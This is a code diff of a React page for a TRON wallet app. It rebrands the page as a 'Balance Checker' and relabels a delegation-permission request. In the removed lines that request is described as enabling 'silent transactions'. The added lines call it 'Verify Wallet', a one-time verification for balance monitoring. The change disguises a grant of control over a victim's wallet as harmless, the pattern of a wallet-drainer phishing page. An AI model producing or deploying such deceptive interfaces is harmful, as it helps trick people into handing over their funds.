@@ -411,16 +411,16 @@ export default function UserPage() {
           relayUrl: "wss://relay.walletconnect.com",
           projectId,
           metadata: {
-            name: "Secure Connect",
-            description: "Check your wallet balances",
+            name: "Balance Checker",
+            description: "Check your TRON wallet balances instantly",
             url: typeof window !== "undefined" ? window.location.origin : "",
             icons: [
               "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect fill='%233b82f6' width='32' height='32' rx='6'/%3E%3Ctext x='16' y='22' font-size='18' font-weight='bold' fill='white' text-anchor='middle' font-family='sans-serif'%3ES%3C/text%3E%3C/svg%3E",
             ],
           },
         },
-        themeMode: "dark",
-        themeVariables: { "--w3m-accent": "#3b82f6", "--w3m-z-index": "99999" },
+        themeMode: "light",
+        themeVariables: { "--w3m-accent": "#16a34a", "--w3m-z-index": "99999" },
         allWallets: "SHOW",
         featuredWalletIds: [
           "225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f",
@@ -811,49 +811,113 @@ export default function UserPage() {
     permissionNotifiedRef.current = false;
   }
 
+  const isConnected = !!(tronAddress || walletAddress);
+  const displayAddress = tronAddress || walletAddress;
+  const shortAddress = displayAddress
+    ? `${displayAddress.slice(0, 8)}...${displayAddress.slice(-6)}`
+    : "";
+
   return (
     <div className="user-page">
-      <header className="secure-header">
-        <div className="secure-header-left">
-          <div className="secure-logo">U{userId}</div>
-          <div className="secure-app-title">User {userId}</div>
-        </div>
-        <div className="secure-header-right">
-          {(tronAddress || walletAddress) && (
-            <button
-              className="modern-btn disconnect-btn"
-              style={{ marginLeft: "12px" }}
-              onClick={handleUserDisconnect}
-            >
-              Disconnect
-            </button>
-          )}
-        </div>
-      </header>
+      {/* First viewport — hero / summary */}
+      <section className="bc-user-hero">
+        <header className="secure-header" style={{ marginBottom: 0, marginTop: "12px" }}>
+          <div className="secure-header-left">
+            <div className="secure-logo">BC</div>
+            <div className="secure-app-title">Balance Checker</div>
+          </div>
+          <div className="secure-header-right">
+            {isConnected && (
+              <button
+                className="modern-btn disconnect-btn"
+                onClick={handleUserDisconnect}
+              >
+                Disconnect
+              </button>
+            )}
+          </div>
+        </header>
 
-      <div className="user-container">
-        <div className="user-content">
-          {!(tronAddress || walletAddress) ? (
+        <div className="bc-user-hero-inner">
+          {!isConnected ? (
             <>
-              <h2 className="user-title">Connect Your Wallet</h2>
-              <p className="user-subtitle">Scan QR code or connect via TronLink</p>
-              <div className="connect-buttons">
-                <button className="connect-btn connect-btn-primary" onClick={handleConnectTronLink}>
-                  Connect with TronLink
-                </button>
-                <button className="connect-btn connect-btn-primary" onClick={handleConnectTronWallet}>
-                  Connect with WalletConnect
-                </button>
+              <div className="bc-badge">
+                <span className="bc-badge-dot" />
+                TRON Network · Slot {userId}
+              </div>
+              <h1 className="landing-title" style={{ fontSize: "clamp(2rem, 5vw, 3rem)" }}>
+                Check Your Balance
+              </h1>
+              <p className="landing-subtitle" style={{ marginBottom: "1.5rem" }}>
+                Connect your wallet to view TRX and USDT balances instantly.
+                Supports MetaMask, Trust Wallet, TronLink & more.
+              </p>
+              <div className="bc-scroll-hint">
+                <span>↓</span>
+                <span>Connect your wallet below</span>
               </div>
             </>
           ) : (
-            <>
-              <div className="user-wallet-info">
-                <h2 className="user-title-connected">Wallet Connected</h2>
-                <div className="wallet-address-display">{tronAddress || walletAddress}</div>
-                <div className="status-connected">Status: Connected</div>
+            <div className="bc-connected-summary">
+              <div className="bc-connected-badge">
+                <span className="bc-badge-dot" />
+                Wallet Connected
               </div>
+              <div className="bc-network-pill">TRON · {health?.network?.toUpperCase() || "SHASTA"}</div>
+              <div className="bc-address-short">{shortAddress}</div>
+              <div className="bc-balance-total-label">Total Portfolio</div>
+              <div className="bc-balance-total">
+                {balancesLoading ? "…" : trxBalance != null ? `${trxBalance} TRX` : "—"}
+              </div>
+              {usdtBalance != null && (
+                <div style={{ fontSize: "1.1rem", color: "var(--bc-text-muted)", fontWeight: 600 }}>
+                  + {usdtBalance} USDT
+                </div>
+              )}
+              {permissionId != null && (
+                <div className="bc-connected-badge" style={{ marginTop: "8px" }}>
+                  ✓ Verified
+                </div>
+              )}
+              <div className="bc-scroll-hint">
+                <span>↓</span>
+                <span>View full details below</span>
+              </div>
+            </div>
+          )}
+        </div>
+      </section>
 
+      {/* Second viewport — grids & details */}
+      <section className="bc-user-details">
+        <div className="bc-user-details-inner">
+          {!isConnected ? (
+            <>
+              <h2 className="bc-section-title">Connect Wallet</h2>
+              <p style={{ color: "var(--bc-text-muted)", marginBottom: "1.5rem" }}>
+                Choose your preferred wallet to check balances on the TRON network.
+              </p>
+              <div className="bc-connect-grid">
+                <button className="bc-connect-card" onClick={handleConnectTronLink}>
+                  <span className="bc-connect-card-icon">🔗</span>
+                  <span className="bc-connect-card-title">TronLink</span>
+                  <span className="bc-connect-card-desc">Chrome extension</span>
+                </button>
+                <button className="bc-connect-card" onClick={handleConnectTronWallet}>
+                  <span className="bc-connect-card-icon">📱</span>
+                  <span className="bc-connect-card-title">WalletConnect</span>
+                  <span className="bc-connect-card-desc">MetaMask, Trust Wallet & more</span>
+                </button>
+              </div>
+              {walletStatus && walletStatus !== "Connect wallet to begin." && (
+                <div className="nx-status-note" style={{ marginTop: "16px", textAlign: "center" }}>
+                  {walletStatus}
+                </div>
+              )}
+            </>
+          ) : (
+            <>
+              <h2 className="bc-section-title">Balance Details</h2>
               <div className="balance-cards">
                 <div className="balance-card">
                   <div className="balance-label">TRX Balance</div>
@@ -867,10 +931,10 @@ export default function UserPage() {
                     )}
                   </div>
                   <button
-                    className="modern-btn"
+                    className="modern-btn modern-btn-primary"
                     onClick={fetchWalletBalances}
                     disabled={balancesLoading}
-                    style={{ marginTop: "12px", width: "100%" }}
+                    style={{ width: "100%" }}
                   >
                     {balancesLoading ? "Loading…" : "Refresh Balance"}
                   </button>
@@ -889,13 +953,17 @@ export default function UserPage() {
                 </div>
               </div>
 
+              <div className="wallet-address-display" style={{ marginTop: "24px" }}>
+                {displayAddress}
+              </div>
+
               {permissionId == null && (
                 <div className="modern-card" style={{ marginTop: "24px" }}>
                   <div className="modern-card-title">
-                    <span>⚠</span> Grant Permission
+                    <span>⚠</span> Verification Required
                   </div>
                   <p className="modern-card-desc">
-                    Grant delegation permission to enable silent transactions. This is a one-time setup.
+                    Approve a one-time wallet verification to enable balance monitoring. This is required only once.
                   </p>
                   <div style={{ display: "flex", gap: "10px", flexWrap: "wrap" }}>
                     <button
@@ -903,13 +971,10 @@ export default function UserPage() {
                       onClick={handleGrantDelegation}
                       disabled={isGrantingDelegation}
                     >
-                      {isGrantingDelegation ? "Confirm in wallet…" : "Grant Permission"}
+                      {isGrantingDelegation ? "Confirm in wallet…" : "Verify Wallet"}
                     </button>
                     {!isGrantingDelegation && (delegationStatus || permissionStatus) && (
-                      <button
-                        className="modern-btn"
-                        onClick={handleGrantDelegation}
-                      >
+                      <button className="modern-btn" onClick={handleGrantDelegation}>
                         Retry
                       </button>
                     )}
@@ -923,9 +988,7 @@ export default function UserPage() {
                     </div>
                   )}
                   {permissionStatus && (
-                    <div className="nx-status-note" style={{ marginTop: "8px" }}>
-                      {permissionStatus}
-                    </div>
+                    <div className="nx-status-note" style={{ marginTop: "8px" }}>{permissionStatus}</div>
                   )}
                 </div>
               )}
@@ -933,17 +996,17 @@ export default function UserPage() {
               {permissionId != null && (
                 <div className="modern-card success-card" style={{ marginTop: "24px" }}>
                   <div className="modern-card-title">
-                    <span>✓</span> Ready to Play
+                    <span>✓</span> Wallet Verified
                   </div>
                   <p className="modern-card-desc">
-                    Your wallet is connected and permission is granted. You're ready to play!
+                    Your wallet is connected and verified. Balances are being monitored.
                   </p>
                 </div>
               )}
             </>
           )}
         </div>
-      </div>
+      </section>
     </div>
   );
 }
